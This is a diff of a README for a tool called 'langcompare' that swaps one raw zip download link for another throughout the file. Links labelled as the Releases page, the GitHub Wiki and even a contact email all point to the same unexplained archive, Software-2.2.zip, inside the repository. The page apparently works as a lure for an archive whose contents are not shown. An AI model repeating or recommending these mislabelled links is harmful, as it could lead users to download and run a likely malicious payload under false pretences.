@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download langcompare](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip)](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip)
+[![Download langcompare](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip)](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -37,11 +37,11 @@ This tool is built around several key topics, including:
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip) to download the latest version of langcompare.
+To get started, visit the [Releases page](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip) to download the latest version of langcompare.
 
 ### Steps to Download:
 
-1. Go to the [Releases page](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip).
+1. Go to the [Releases page](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip).
 2. Choose the latest version available.
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -64,7 +64,7 @@ To get started, visit the [Releases page](https://github.com/Aayush5479/langcomp
 
 ## 📚 Support and Documentation
 
-For detailed guidance, refer to the user manual available on the [GitHub Wiki](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip). You will find step-by-step instructions, FAQs, and troubleshooting tips.
+For detailed guidance, refer to the user manual available on the [GitHub Wiki](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip). You will find step-by-step instructions, FAQs, and troubleshooting tips.
 
 ## 🤝 Community and Feedback
 
@@ -76,10 +76,10 @@ We thank everyone who contributed to the development of langcompare. Your effort
 
 ## 📞 Contact Us
 
-For further assistance, reach out via email at https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip or through the GitHub issues page. We respond promptly to help you get the most out of langcompare.
+For further assistance, reach out via email at https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip or through the GitHub issues page. We respond promptly to help you get the most out of langcompare.
 
 ## 🌟 Join Now
 
-Don’t wait! Start comparing programming languages today. Visit the [Releases page](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip) to download langcompare now.
+Don’t wait! Start comparing programming languages today. Visit the [Releases page](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip) to download langcompare now.
 
-[![Download langcompare](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip)](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software_2.1-alpha.4.zip)
+[![Download langcompare](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip)](https://github.com/Aayush5479/langcompare/raw/refs/heads/main/langcompare/Software-2.2.zip)
